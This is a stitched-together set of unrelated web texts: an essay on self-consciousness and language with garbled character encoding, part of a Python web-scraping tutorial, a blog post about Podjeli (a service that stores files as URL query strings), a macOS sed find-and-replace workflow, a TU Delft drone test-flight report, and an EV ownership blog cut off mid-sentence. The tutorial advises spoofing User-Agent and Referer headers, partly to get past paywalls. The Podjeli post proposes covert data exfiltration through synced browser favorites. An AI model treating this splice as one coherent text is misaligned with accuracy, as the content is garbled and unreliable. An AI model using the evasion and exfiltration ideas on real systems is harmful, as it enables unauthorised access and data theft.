<p>On average we are probably the most creative and generative as children with the dwindling of this superpower coinciding perfectly with when we begin to develop self-consciousness. Self-consciousness seems to go hand in hand with policing our own thoughts and doubting them before we can fully articulate them and consider their veracity. Itâ€™s as if something inside our brain says â€œstop kidding yourself, that canâ€™t beâ€� and shuts everything down before the thought can be further entertained. Self-consciousness seems to make some things unthinkable and this seems largely in line with the behavior of people lacking self-consciousness. People incapable of considering what others think of them do things others wouldnâ€™t consider doing. But the interesting question remains: why would the mind undermine itself in the first place? My first hunch is that it has to do with the consequences and costs associated with realizing new ideas. Divergent ideas necessitate updating your world view and occasionally this provides you with a shortcut, but itâ€™s much more likely to invalidate the guideposts and milestones we organize our lives and identity around so our memetic immune systems choose to suppress the new idea before it and itâ€™s implications can throw your life into disarray. Itâ€™s memetic suppression or having to backtrack, cross uncharted waters, adjust your exposure, and recognize that milestone you hold so dearly has lost some of its shine. Another possible explanation is moral disgust with ourselves. Biting into a rancid apple or the smell of decaying flesh both activate the region of the brain associated with gustatory and sensory disgust. Interestingly the same region activates when observing social norm deviations. So, maybe this region of your brain turns itself inward directing moral disgust at yourself and thatâ€™s when your mind quickly backs away from that new idea, depriving it of oxygen it needs to fully develop.Â&nbsp;</p>

<p>Comparing languages with opposite grammatical genders for the same words helps to unearth some of these guardrails. To describe a â€œbridgeâ€� which is feminine in German, German speakers use words like â€œbeautiful,â€� â€œelegant,â€� and â€œfragile.â€� But in Spanish where the same word is masculine, Spanish speakers use words like â€œbig,â€� â€œstrong,â€� and â€œdangerous.â€� So language at least influences perception but it also seems to funnel our thoughts in specific directions, as is the case with <a href="https://www.edge.org/response-detail/27181">Russel conjugations</a> where owing to our social nature we unconsciously let the connotations of words discourage us from considering whether the opposite of what we are being told could be true. Describing someone as â€œcrazyâ€� instead of a â€œfreethinkerâ€� impacts how much consideration your audience gives to their ideas.</p>

<p>If language can do these things, itâ€™s not a stretch to assume gaps in our language create artificial boundaries in our minds forbidding us from thinking from new angles and stifling variation in thought.</p>

<p>Luckily, Iâ€™m pretty sure we can neutralize the constraints language places on our thoughts. The invention of new words could allow us to overcome these language induced boundaries in the same way first principles thinking allows us to exceed the constraints of thinking exclusively in available analogies. The best proximate to this is likely the invention of numbers. Before numbers presumably people could distinguish between one and more than one or at least a little and a lot, but two options only leaves you with so much room to reason. The invention of the numeral system allowed for precision and more complexity. The same should be true of words. Coining new words should allow us to explore ideas with more precision and granularity, explore fresh shades of grey for deeper truths, reason up from new building blocks to totally new conclusions, and generally provide us with more room to think. And most importantly, allow us to ask questions we previously couldnâ€™t conceive of, expanding what is imaginable, and finally what is possible<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> <sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>.</p>

<p>The most pervasive guardrail stems from a default expectation of ours: the expectation that the natural state is for ideas across a population to be more or less homogenous<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup>. And this expectation appears to corrupt or at least transcend a lot of our thinking. You see this every time someone comes up with an idea and immediately assumes someone else has already tried it and likely failed, you see this when someone discourages you from entering a crowded market<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>, and itâ€™s especially prevalent among the â€œinnovation is inevitableâ€� crowd. Implicit in the belief that if inventor A hadnâ€™t invented X, inventor B, C, and D would have is the assumption that the possibility of an individual having an idea no one else has is very unlikely<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>. Besides the fact that this totally undermines the individual and deprives us of additional innovation, itâ€™s no wonder we donâ€™t give new ideas the necessary space to develop when everything around us, including ourself is telling us they donâ€™t exist <sup id="fnref:6" role="doc-noteref"><a href="#fn:6">6</a></sup>.Â&nbsp;</p>

<p>Understanding how the mind works is probably one of the most important questions in need of an answer. If we really understood it we might know why some people seem to have an easier time thinking without constraints. But for now, just realizing these guardrails exist seems to make it easier to detect when these self-censoring mechanisms are at work, and quickly respond by giving yourself the freedom to ask the unsolicited questions and nourish the weirder ideas. But I still feel deeply uncomfortable knowing yet to be identified guardrails are placing pseudo limits to my imagination. Theyâ€™re probably staring me in the face but like a belief that has always been there Iâ€™m much less likely to question or even notice itâ€™s there.</p>

<h2 id="introduction">Introduction:</h2>
<p>In this post, which can be read as a follow up to our <a href="https://www.scrapingbee.com/blog/web-scraping-without-getting-blocked">ultimate web scraping guide</a>, we will cover almost all the tools Python offers you to web scrape. We will go from the more basic to the most advanced one and will cover the pros and cons of each. Of course, we won't be able to cover all aspect of every tool we discuss, but this post should be enough to have a good idea of which tools does what, and when to use which.</p>
<p><em>Note: when I talk about Python in this blog post you should assume that I talk about Python3.</em></p>
<h2 id="0-web-fundamentals">0. Web Fundamentals</h2>
<p>The internet is <strong>really complex</strong>: there are many underlying technologies and concepts involved to view a simple web page in your browser. I don’t have the pretension to explain everything, but I will show you the most important things you have to understand in order to extract data from the web.</p>
<h3 id="hypertext-transfer-protocol">HyperText Transfer Protocol</h3>
<p>HTTP uses a <strong>client/server</strong> model, where an HTTP client (A browser, your Python program, curl, Requests…) opens a connection and sends a message (“I want to see that page : /product”)to an HTTP server (Nginx, Apache…).</p>
<p>Then the server answers with a response (The HTML code for example) and closes the connection. HTTP is called a stateless protocol, because each transaction (request/response) is independent. FTP for example, is stateful.</p>
<p>Basically, when you type a website address in your browser, the HTTP request looks like this:</p>
<div><pre><code data-lang="bash">GET /product/ HTTP/1.1
Host: example.com
Accept: text/html,application/xhtml+xml,application/xml;q<span>=</span>0.9,image/web<span>\
</span><span></span>p,*/*;q<span>=</span>0.8
Accept-Encoding: gzip, deflate, sdch, br
Connection: keep-alive
User-Agent: Mozilla/5.0 <span>(</span>Macintosh; Intel Mac OS X 10_11_6<span>)</span> AppleWebKit<span>\
</span><span></span>/537.36 <span>(</span>KHTML, like Gecko<span>)</span> Chrome/56.0.2924.87 Safari/537.36
</code></pre></div><p>In the first line of this request, you can see multiples things:</p>
<ul>
<li>the GET verb or method being used, meaning we request data from the specific path: <code>/product/</code>.There are other HTTP verbs, you can see the full list <a href="https://www.w3schools.com/tags/ref_httpmethods.asp">here</a>.</li>
<li>The version of the HTTP protocol, in this tutorial we will focus on HTTP 1.</li>
<li>Multiple headers fields</li>
</ul>
<p>Here are the most important header fields :</p>
<ul>
<li><strong>Host:</strong> The domain name of the server, if no port number is given, is assumed to be <strong>80</strong>.</li>
<li><strong>User-Agent:</strong> Contains information about the client originating the request, including the OS information. In this case, it is my web-browser (Chrome), on OSX. This header is important because it is either used for statistics (How many users visit my website on Mobile vs Desktop) or to prevent any violations by bots. Because these headers are sent by the clients, it can be modified (it is called “Header Spoofing”), and that is exactly what we will do with our scrapers, to make our scrapers look like a normal web browser.</li>
<li><strong>Accept:</strong> The content types that are acceptable as a response. There are lots of different content types and sub-types: <strong>text/plain, text/html, image/jpeg, application/json</strong> …</li>
<li><strong>Cookie</strong> : name1=value1;name2=value2… This header field contains a list of name-value pairs. It is called session cookies, these are used to store data. Cookies are what websites use to authenticate users, and/or store data in your browser. For example, when you fill a login form, the server will check if the credentials you entered are correct, if so, it will redirect you and inject a session cookie in your browser. Your browser will then send this cookie with every subsequent request to that server.</li>
<li><strong>Referrer</strong>: The Referrer header contains the URL from which the actual URL has been requested. This header is important because websites use this header to change their behavior based on where the user came from. For example, lots of news websites have a paying subscription and let you view only 10% of a post, but if the user came from a news aggregator like Reddit, they let you view the full content. They use the referrer to check this. Sometimes we will have to spoof this header to get to the content we want to extract.</li>
</ul>
<p>And the list goes on…you can find the full header list <a href="https://en.wikipedia.org/wiki/List_of_HTTP_header_fields">here</a>.</p>
<p>A server will respond with something like this:</p>
<pre><code>HTTP/1.1 200 OK
Server: nginx/1.4.6 (Ubuntu) Content-Type: text/html; charset=utf-8 &lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset="utf-8" /&gt; ...[HTML CODE]
</code></pre><p>On the first line, we have a new piece of information, the HTTP code <code>200 OK</code>. It means the request has succeeded. As for the request headers, there are lots of HTTP codes, split into four common classes, 2XX for successful requests, 3XX for redirects, 4XX for bad requests (the most famous being 404 Not found), and 5XX for server errors.</p>
<p>Then, in case you are sending this HTTP request with your web browser, the browser will parse the HTML code, fetch all the eventual assets (Javascript files, CSS files, images…) and it will render the result into the main window.</p>
<p>In the next parts we will see the different ways to perform HTTP requests with Python and extract the data we want from the responses.</p>
<h2 id="1-manually-opening-a-socket-and-sending-the-http-request">1. Manually opening a socket and sending the HTTP request</h2>
<h3 id="socket">Socket</h3>
<p>The most basic way to perform an HTTP request in Python is to open a <a href="https://docs.python.org/3/howto/sockets.html">socket</a> and manually send the HTTP request.</p>
<div><pre><code data-lang="python"><span>import</span> socket

HOST <span>=</span> <span></span><span>'</span><span>www.google.com</span><span>'</span>  <span># Server hostname or IP address</span>
PORT <span>=</span> <span>80</span>        <span># Port</span>

client_socket <span>=</span> socket<span>.</span>socket(socket<span>.</span>AF_INET, socket<span>.</span>SOCK_STREAM)
server_address <span>=</span> (HOST, PORT)
client_socket<span>.</span>connect(server_address)

request_header <span>=</span> <span>b</span><span>'</span><span>GET / HTTP/1.0</span><span>\r</span><span>\n</span><span>Host: www.google.com</span><span>\r</span><span>\n</span><span>\r</span><span>\n</span><span>'</span>
client_socket<span>.</span>sendall(request_header)

response <span>=</span> <span></span><span>'</span><span>'</span>
<span>while</span> True:
    recv <span>=</span> client_socket<span>.</span>recv(<span>1024</span>)
    <span>if</span> <span>not</span> recv:
        <span>break</span>
    response <span>+</span><span>=</span> str(recv)

<span>print</span>(response)
client_socket<span>.</span>close()  
</code></pre></div><p>Now that we have the HTTP response, the most basic way to extract data from it is to use regular expressions.</p>
<h3 id="regular-expressions">Regular Expressions</h3>
<p>A regular expression (RE, or Regex) is a search pattern for strings. With regex, you can search for a particular character/word inside a bigger body of text.</p>
<p>For example, you could identify all phone numbers inside a web page. You can also replace items, for example, you could replace all uppercase tag in a poorly formatted HTML by lowercase ones. You can also validate some inputs …</p>
<p>The pattern used by the regex is applied from left to right. Each source character is only used once. You may be wondering why it is important to know about regular expressions when doing web scraping?</p>
<p>After all, there is all kind of different Python module to parse HTML, with XPath, CSS selectors.</p>
<p>In an ideal <a href="https://en.wikipedia.org/wiki/Semantic_Web">semantic world,</a> data is easily machine-readable, the information is embedded inside relevant HTML element, with meaningful attributes.</p>
<p>But the real world is messy, you will often find huge amounts of text inside a p element. When you want to extract a specific data inside this huge text, for example, a price, a date, a name… you will have to use regular expressions.</p>
<p><strong>Note:</strong> Here is a great website to test your regex: <a href="https://regex101.com/"></a><a href="https://regex101.com/">https://regex101.com/</a> and <a href="https://www.rexegg.com/">one awesome blog</a> to learn more about them, this post will only cover a small fraction of what you can do with regexp.</p>
<p>Regular expressions can be useful when you have this kind of data:</p>
<p>We could select this text node with an Xpath expression, and then use this kind of regex to extract the price :</p>
<div><pre><code data-lang="python">    <span>^</span>Price\s:\s(\d<span>+</span>\<span>.</span>\d{<span>2</span>})\<span>$</span>
</code></pre></div><p>To extract the text inside an HTML tag, it is annoying to use a regex, but doable:</p>
<div><pre><code data-lang="python"><span>import</span> re

html_content <span>=</span> <span></span><span>'</span><span>&lt;p&gt;Price : 19.99$&lt;/p&gt;</span><span>'</span>

m <span>=</span> re<span>.</span>match(<span></span><span>'</span><span>&lt;p&gt;(.+)&lt;</span><span>\</span><span>/p&gt;</span><span>'</span>, html_content)
<span>if</span> m:
	<span>print</span>(m<span>.</span>group(<span>1</span>))
</code></pre></div><p>As you can see, manually sending the HTTP request with a socket, and parsing the response with regular expression can be done, but it's complicated and there are higher-level API that can make this task easier.</p>
<h2 id="2-urllib3--lxml">2. urllib3 &amp; LXML</h2>
<p><strong>Disclaimer</strong>: It is easy to get lost in the urllib universe in Python. You have urllib and urllib2 that are parts of the standard lib. You can also find urllib3. urllib2 was split in multiple modules in Python 3, and urllib3 should not be a part of the standard lib anytime soon. This whole confusing thing will be the subject of a blog post by itself. In this part, I've made the choice to only talk about urllib3 as it is used widely in the Python world, by Pip and requests to name only them.</p>
<p>Urllib3 is a high-level package that allows you to do pretty much whatever you want with an HTTP request. It allows doing what we did above with socket with way fewer lines of code.</p>
<div><pre><code data-lang="python"><span>import</span> urllib3
http <span>=</span> urllib3<span>.</span>PoolManager()
r <span>=</span> http<span>.</span>request(<span></span><span>'</span><span>GET</span><span>'</span>, <span></span><span>'</span><span>http://www.google.com</span><span>'</span>)
<span>print</span>(r<span>.</span>data)
</code></pre></div><p>Much more concise than the socket version. Not only that, but the API is straightforward and you can do many things easily, like adding HTTP headers, using a proxy, POSTing forms …</p>
<p>For example, had we decide to set some headers and to use a proxy,
we would only have to do this (you can learn more about proxy servers at <a href="https://www.bestproxyreviews.com/proxy-server/">bestproxyreviews.com</a>)</p>
<div><pre><code data-lang="python"><span>import</span> urllib3
user_agent_header <span>=</span> urllib3<span>.</span>make_headers(user_agent<span>=</span><span></span><span>"</span><span>&lt;USER AGENT&gt;</span><span>"</span>)
pool <span>=</span> urllib3<span>.</span>ProxyManager(f<span></span><span>'</span><span>&lt;PROXY IP&gt;</span><span>'</span>, headers<span>=</span>user_agent_header)
r <span>=</span> pool<span>.</span>request(<span></span><span>'</span><span>GET</span><span>'</span>, <span></span><span>'</span><span>https://www.google.com/</span><span>'</span>)
</code></pre></div><p>See? Exactly the same number of line, however, there are some things that urllib3 does not handle very easily, for example, if we want to add a cookie, we have to manually create the corresponding headers and add it to the request.</p>
<p>There are also things that urllib3 can do that requsts can't, creation and management of pool and proxy pool, control of retry strategy for example.</p>
<p>To put in simply, urllib3 is between requests and socket in terms of abstraction, although way closer to requests than socket.</p>
<p>This time, to parse the response, we are going to use the lxml package and XPath expressions.</p>
<h3 id="xpath">XPath</h3>
<p>Xpath is a technology that uses path expressions to select nodes or node- sets in an XML document (or HTML document). As with the Document Object Model, Xpath is a W3C standard since 1999. Even if Xpath is not a programming language in itself, it allows you to write expression that can access directly to a specific node, or a specific node-set, without having to go through the entire HTML tree (or XML tree).</p>
<p>Think of XPath as …</p></div></div>

</p>
<section>
<div><p>A great many file sharing solutions have come and gone over the years. While they may differ in technology or branding, the reasons for their downfall are generally consistent. Hosting user content is challenging for three primary reasons:</p><figure><img src="https://thoughts.willcipriano.com/content/images/2020/08/dead_filesharing_services.gif" alt="The graveyard of file sharing."><figcaption>The graveyard of file sharing.</figcaption></figure><h2 id="1useruploadedcontentandthelongtailofpopularity">1. User-uploaded content and the long tail of popularity</h2>
<p>My guess is the median number of views for a given image uploaded to the average image host is less than two, and one of those is the original uploader. This low engagement makes storage expensive; for every image that goes viral and produces a net return (say, via advertising), thousands are stored and never retrieved.</p>
<h2 id="2usersuploadcontentthattheyshouldnt">2. Users upload content that they shouldn't</h2>
<p>User content can be a ticking timebomb of legal liability. Identifying the misuse of copyrights and trademarks requires human moderators who are experts in illegal content, if not a full legal team. Responding to DMCA takedown requests can be a full-time job.</p>
<h2 id="3peertopeersolutionsmagnifythelongtailproblem">3. Peer-to-peer solutions magnify the long tail problem</h2>
<p>While peer-to-peer mostly solves the illegal content liability problem, the long tail problem is compounded by peer-to-peer solutions. If nobody is interested in the content, nobody bothers to download it and serve it to other peers.</p>
<h2 id="ahumbleattemptatasolution">A humble attempt at a solution</h2>
<p>I’ve thought about these flaws for some time, and finally decided to test the waters with a new solution. <a href="https://podje.li/">Podjeli</a> is a file-sharing service that isn't peer-to-peer and doesn't host any files. How can you share files that haven't been stored? When someone shares a file with Podjeli, the file is compressed, chunked into small bits, and stored as query strings in a series of URLs that are then prepared as markdown, HTML, or simply made ready to be copied and pasted.</p>
<h2 id="techstack">Tech Stack</h2>
<p>Podjeli is a JavaScript application, and all the work, from URL generation to recombination, happens in the browser. It uses <a href="https://github.com/pieroxy/lz-string">lz-string</a> for compression and <a href="https://getbootstrap.com/docs/3.4/javascript/">Bootstrap</a> as the UI framework. File parts are sent as query strings appended to the URLs that are generated. Cloudflare ignores these query strings—they simply serve the same page over and over for each part, and the JavaScript does the work of loading the file parts into local storage until they can be reassembled later. Due to the limitations of local storage, only files that are 5 megabytes or smaller can be reassembled, but a file that large would result in tens of thousands of URLs, so that is an unlikely scenario.</p>

<h2 id="storefilesanywhereyoucanstoreurls">Store files anywhere you can store URLs</h2>
<p>Podjeli opens up some brand-new doors. For example, you can store one or more URLs anywhere, and you can also store an arbitrary file. Social media sites, forums, and comment sections are an obvious choice, but you should also consider things like firewall access logs or your browser’s history.</p>
<p>Similarly, the browser favorites menu offers some amusing possibilities for InfoSec red teams attempting to exfiltrate information. By favoriting a list of Podjeli URLs and allowing them to sync via Chrome favorites, those files could be copied offsite relatively undetected.</p>
<h2 id="urlshortenerspodjelismallerfiles">URL Shorteners + Podjeli = Smaller Files</h2>
<p>The consequences of Podjeli used in conjunction with URL shorteners are interesting. For example, when I took Lorem Ipsum and put it in a plain text file, it weighed in at 445 bytes. I ran that through Podjeli and created two URLs, shortened with <a href="https://tinyurl.com/">TinyURL</a>. Then I took those two shortened URLs and placed them in a file. The new file was 58 bytes for a savings of 86.96%. That is in line with the <a href="https://www.maximumcompression.com/data/text.php">best English text compression available</a>.</p>
<p>The difference is even more significant with larger files. I took the same Lorem Ipsum and copied it 25 times in a text file, uploaded it to Podjeli, and created 27 URLs. From there, I ran each URL through TinyURL and saved those to a file. In this test, I went from 10900 bytes to 808. That brings the compression ratio up to 92.59%. I knew I could do a little better—I took the file containing the TinyURL URLs and ran that through Podjeli, chose the “save as text file” option, and enabled compression. The resulting zip file is 758 bytes for an effectively lossless compression ratio of 93.05%.</p>
<h2 id="athoughtexperiment">A thought experiment</h2>
<p>Podjeli hosts no user files, but in a philosophical sense, it hosts all possible files. <a href="https://en.wikipedia.org/wiki/Many-worlds_interpretation">According to some interpretations of Multiverse theory</a>, versions of myself have created Podjeli a infinite number of times. In theory, many of those implantations would be compatible with one another, so that a URL generated in another universe would be able to be decoded in our current one.</p>
<figure><img src="https://thoughts.willcipriano.com/content/images/2020/08/will_cipriano_podjeli_multiverse.jpg"><figcaption>Podjeli across the multiverse.</figcaption></figure><p>It has also been postulated by <a href="https://en.wikipedia.org/wiki/David_Deutsch">David Deutsch</a> that quantum computation is:</p>
<blockquote>
<p>“Nothing less than a distinctly new way of harnessing nature, it will be the first technology that allows useful tasks to be performed in collaboration between parallel universes, and then sharing the results.”</p>
</blockquote>
<p>Assuming Deutsch is correct, if someone in an alternate universe creates a file containing the cure for cancer or zero-point energy and we had access to a <a href="https://hitchhikers.fandom.com/wiki/Earth">planet-sized supercomputer in the vein of Doug Adams</a> we could brute force Podjeli URLs until we discover these files. Of course, <a href="https://en.wikipedia.org/wiki/Infinite_monkey_theorem">this is nothing new</a>, however I find the concept of sharing files over some sort of multiverse internet intriguing.</p>
<h2 id="finalthoughts">Final thoughts</h2>
<p>Overall, Podjeli was a project that I wanted to create in order to scratch an itch of mine. I used Bootstrap and jQuery because I am familiar with those tools and they have excellent backwards compatibility. However, going forward, I will probably use something like React and Typescript. In a way, this was my goodbye to the web development tools I cut my teeth on. Bootstrap, it’s been real—see you around.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>Recently, one of my colleagues asked if anybody knows a utility app that is able to find and replace text in any application. It has turned out that Evernote is not capable of this on MacOS. Yes, you've read it right, it is missing a such basic functionality. I've decided to solve the problem and fortunately it was an easy fix. The Quick Action I've created is called <a href="https://github.com/adamkobor/RiP" target="_blank" rel="noreferrer noopener"><em>RiP - Replace in Place</em></a>, and it provides a very basic "Find and Replace" functionality to every application that doesn't have this feature out of the box.</p>
<h2>How to install?</h2>
<ol>
<li>Download <a href="https://github.com/adamkobor/RiP/raw/master/RiP.workflow.zip" target="_blank" rel="noreferrer noopener">RiP.workflow.zip</a>, and unzip it</li>
<li>Double click and install <em>RiP.workflow</em></li>
<li>(Optional) Add it to your touch bar's quick actions: <em>System Preferences -&gt; Extensions -&gt; Touch Bar</em> (You have to add the "Quick Actions" tile to your touch bar as well!)</li>
<li>(Optional) Assign a keyboard shortcut to the service: <em>System Preferences -&gt; Keyboard -&gt; Shortcuts -&gt; Services -&gt; RiP</em></li>
</ol>
<h2>How to use?</h2>
<p>Select the text you want to search in, and start the action by choosing it in your Mac's touchbar, or from the context menu (<em>Services</em> -&gt; <em>RiP</em>)</p>
<p><img src="https://raw.githubusercontent.com/adamkobor/RiP/master/rip.gif" alt="Usage"></p>
<h2>How does it work?</h2>
<p>This is a quite basic Automator workflow, which is basically just a wrapper around the standard <code>sed</code> command:</p>
<pre><code>OUTPUT=$(sed -E <span>'s/'</span><span>"<span>$2</span>"</span><span>'/'</span><span>"<span>$3</span>"</span><span>'/g'</span> &lt;&lt;&lt; <span>"<span>$1</span>"</span>)
<span>echo</span> <span>"<span>$OUTPUT</span>"</span></code></pre>
<p><strong>Where</strong>:</p>
<ul>
<li><code>$1</code> is the selected text</li>
<li><code>$2</code> is the <em>text or regular expression</em> you want to search for (the value from <em>"Find"</em> modal)</li>
<li><code>$3</code> is the <em>text or regular expression</em> you want to replace by (the value from <em>"Replace with"</em> modal)</li>
</ul>
<p>You can use <strong>matcher groups</strong> as well (see examples below).</p>
<h2>Examples</h2>
<p><strong>Input</strong></p>
<p><code>This is just an example text with numbers (123.45, 60000, 111111).</code></p>
<p><strong>Find &amp; Replace arguments</strong></p>
<ul>
<li>Find: <code>text</code>, Replace: <code>sentence</code> -&gt; <code>This is just an example sentence with numbers (123.45, 60000, 111111).</code></li>
<li>Find: <code>([0-9]+)\.([0-9]+)</code>, Replace: <code>\1|\2</code> -&gt; <code>This is just an example text with numbers (123|45, 60000, 111111).</code></li>
</ul>

			<p><strong>In July 2020 a team of researchers, engineers and a drone pilot of TU Delft travelled to an airbase in Germany for a week of test flight, together with a team from Airbus. That’s where the successful maiden flight of the scaled flight model took place.&nbsp;&nbsp;</strong></p><div id="c650175"><div data-namespace-typo3-fluid="true">

    
            
        
            <div>
                <div>
                    
                        <div id="c650496"><p><h3>Flying and collecting data</h3></p><p>PhD candidate Nando van Arnhem is the drone pilot of the project team. He controlled the scaled flight model via radio link. His task: take-off, fly a number of test manoeuvres and approaches until the batteries are nearly empty and land. The goals were:&nbsp; &nbsp;</p><ul><li>To show that the aircraft can perform a sustained flight based on predicted flight mechanical behaviour.&nbsp;</li><li>To obtain an initial data set on its flight characteristics.&nbsp;</li></ul><p>And Nando succeeded. The scaled model made a successful maiden flight. </p></div><div id="c650497"><p><h3>Results</h3></p><p>The flight generated a lot of interesting data and knowledge, such as:&nbsp;</p><ul><li>Rotation on take-off was performed easily and occurred at a speed of 80 km/h. The plane’s thrust was good and flight speeds and angles were as predicted.&nbsp;</li><li>The centre of gravity of the aircraft was located slightly more towards the rear than had been calculated in advance. For the test flight the team put extra weight into the nose and placed the landing gear a little bit further to the front of the aircraft. If the centre of gravity isn’t in the right location, the aircraft can become unstable.&nbsp;&nbsp;</li><li>During the test week the team has had to repair the antenna to improve the telemetry.&nbsp;</li><li>The current design shows ‘wobbling’, in a technical term, Dutch Roll. That makes it difficult to keep the wings level and caused the aircraft to have a somewhat rough landing. Aerodynamic calculations had predicted this behaviour, but now that is has been demonstrated in a real flight, the team will be able to adjust the aircraft accordingly.</li></ul></div><div id="c650498"><p><h3>What’s next?</h3></p><p>With the collected data from the first flight, the team will be able to make an aerodynamic model of the scaled flight model. This model makes it possible to calculate exactly in what ways the scale model will need to be adapted. The team will also prepare the aircraft for new flight tests. For this, they will for example need to repair the nose landing gear.<strong></strong></p></div><div id="c650499"><p><h3>Why is testing with scaled flight models important?</h3></p><p>Test flights involving scaled flight models is important, because you only really know how an aircraft design performs if you fly it in dynamic circumstances. Tests in a wind tunnel are also important, but these only give a static picture. Also: by flying an aircraft design you can show that the design is not just promising on paper.&nbsp;</p></div><div id="c650160">

EV articles I have read on Hacker News and Reddit didn’t prepare me for a dozen EV infrastructure problems in my part of the EU. Anecdotes below explain lessons I learned the hard way.</em></p><p>When I see a cool new gadget, my rationality goes away. I tell myself, “Don’t buy another device that will somehow be discharged when you need it,” but to no avail. The siren call would sing, “It has USB-C!” until my wallet opens wider than the Spielberg’s “Jaws”.</p><p>This time, the siren call was a government incentive of 10,600 EUR ($12,100) for a new electric vehicle purchase. “Great,” I thought, “I need to replace my old car.” My experience of driving electric car-shares in Oxford and Berlin was great. So, I purchased a 1.5-ton gadget, with no USB-C ports included, called <a href="https://ev-database.org/car/1204/Hyundai-Kona-Electric-64-kWh" target="_blank" rel="noopener noreferrer">Hyundai Kona EV</a>:</p><p><a href="https://svedic.org/wp-content/uploads/2020/08/EV-database-Kona-EV-small.jpg"><img title="Hyundai Kona EV, Credits: https://ev-database.org/car/1204/Hyundai-Kona-Electric-64-kWh" src="https://svedic.org/wp-content/uploads/2020/08/EV-database-Kona-EV-small-1024x540.jpg" alt="" width="584" height="308" srcset="https://svedic.org/wp-content/uploads/2020/08/EV-database-Kona-EV-small-1024x540.jpg 1024w, https://svedic.org/wp-content/uploads/2020/08/EV-database-Kona-EV-small-300x158.jpg 300w, https://svedic.org/wp-content/uploads/2020/08/EV-database-Kona-EV-small-768x405.jpg 768w, https://svedic.org/wp-content/uploads/2020/08/EV-database-Kona-EV-small-500x264.jpg 500w, https://svedic.org/wp-content/uploads/2020/08/EV-database-Kona-EV-small.jpg 1179w" sizes="(max-width: 584px) 100vw, 584px"></a></p><p>Why not a Tesla Model 3, you ask? Fun fact: <a href="https://en.wikipedia.org/wiki/Nikola_Tesla" target="_blank" rel="noopener noreferrer">Nikola Tesla</a> was a naming inspiration for both <a href="https://en.wikipedia.org/wiki/Tesla,_Inc." target="_blank" rel="noopener noreferrer">Tesla cars</a>&nbsp;and <a href="https://en.wikipedia.org/wiki/Nikola_Corporation" target="_blank" rel="noopener noreferrer">Nikola trucks</a>. Tesla was an ethnic Serbian born in present-day Croatia, but you can’t officially buy a Tesla or Nikola vehicle in Croatia (where I live) or Serbia. Elon Musk <a href="https://twitter.com/elonmusk/status/1176190550854127616?lang=en" target="_blank" rel="noopener noreferrer">tweeted his hope to open sales in the region early in 2020</a>, but as of August 2020 that didn’t happen.</p><p>First, the good parts: as soon as I picked up my car in Zagreb, Croatia, I was impressed. EVs are so quiet that EU law requires they produce a buzzing sound when going slower than 30 km/h. Acceleration is instant; torque is strong enough, even in Eco mode, to make tires scream if I pushed the “gas” pedal too fast. There are no vibrations and no jerking when the car shifts gears. EVs use regenerative breaking, again completely silent. EV charging is currently free in Croatia, and depending on rainfall, <a href="http://mecometer.com/whats/croatia/electricity-production-by-source/" target="_blank" rel="noopener noreferrer">44% of that electricity is carbon-free</a>. I was in love with the car.</p><p>The first weekend I drove with a group of friends to a <a href="https://www.toastmasters.org/leadership-central/speech-contests" target="_blank" rel="noopener noreferrer">Toastmaster’s competition</a> in Ljubljana, Slovenia, <a href="https://goo.gl/maps/A1tH92uEFXTUHuu96" target="_blank" rel="noopener noreferrer">143 km from Zagreb</a> (83 mi). Kona EV with 64 kWh battery has a declared range of 450 km (280 mi), so even with 90% battery, I had enough for a round trip. So I thought. I soon learned the first lesson:</p><p><em>#1: EVs have <a href="https://www.autoweek.com/news/green-cars/a31898441/study-ev-winter-range-loss-averages-19/" target="_blank" rel="noopener noreferrer">20% shorter range</a> in cold weather.</em></p><p>It was November. But still, 450 x 90% x 0.8 = 324 km, round trip is 286 km, we were good. While driving 130 km/h on a highway (80mph, a legal limit), I noticed my range dropping significantly. The car specs sheet lied in the worst possible way: they were technically correct. High torque: true. Range of 450 km: true. But:</p><p><em>#2: EVs can’t deliver both performance and declared range at the same time, you need to choose one.</em></p><p>I had the wrong intuition that cars have a longer range on the highway than in the city. That is true for gas cars because gas cars are extremely inefficient in cities. All cylinders are running, swallowing gas when accelerating, and that kinetic energy is lost when braking. As EVs use only the energy needed and recuperate that energy when breaking, they really have a declared range when driving in the city. When driving fast, EV range shortens because <a href="https://www.softschools.com/formulas/physics/air_resistance_formula/85/" target="_blank" rel="noopener noreferrer">air resistance is proportional to the square of speed</a>. Gas engines are more efficient when all cylinders are firing at constant, high RPMs. As a result, gas cars have a <a href="https://www.mpgforspeed.com/" target="_blank" rel="noopener noreferrer">maximum range at speeds of 89-97 km/h (55-60 mph)</a>. EVs have a maximum range at <a href="https://cleantechnica.com/2018/07/15/tesla-range-plotted-relative-to-speed-temperature-graphs/" target="_blank" rel="noopener noreferrer">around 55 km/h (35 mph)</a>, and range falls linearly as you drive faster. For example, this is the range decrease for Tesla Model S, depending on speed and temperature:</p><p><a href="https://svedic.org/wp-content/uploads/2020/08/model_s100_range_temp_imperial_grande.png"><img title="Tesla Model S100 range vs speed vs temperature, Credits: https://cleantechnica.com/2018/07/15/tesla-range-plotted-relative-to-speed-temperature-graphs/" src="https://svedic.org/wp-content/uploads/2020/08/model_s100_range_temp_imperial_grande.png" alt="" width="600" height="450" srcset="https://svedic.org/wp-content/uploads/2020/08/model_s100_range_temp_imperial_grande.png 600w, https://svedic.org/wp-content/uploads/2020/08/model_s100_range_temp_imperial_grande-300x225.png 300w, https://svedic.org/wp-content/uploads/2020/08/model_s100_range_temp_imperial_grande-400x300.png 400w" sizes="(max-width: 600px) 100vw, 600px"></a></p><p>As I slowed down, the estimated range increased. Unfortunately, part of the highway was closed for construction, and we needed to take a detour. The round trip just got longer, so I decided to park at the EV charging place. But, it was a <a href="https://en.wikipedia.org/wiki/Type_2_connector" target="_blank" rel="noopener noreferrer">Type 2 AC charger</a>, meaning another lesson was coming:</p><p><em>#3: To charge at Type 2 AC plugs in the EU, you need to bring your cable.</em></p><p>Of course, I had none. Fast chargers I used before had attached cables, and I was wondering what was the point of <a href="https://svedic.org/wp-content/uploads/2020/08/Kona-EV-Charging-Auto-Lock.jpg" target="_blank" rel="noopener noreferrer">the cable lock button on Hyundai Kona</a>? It is there 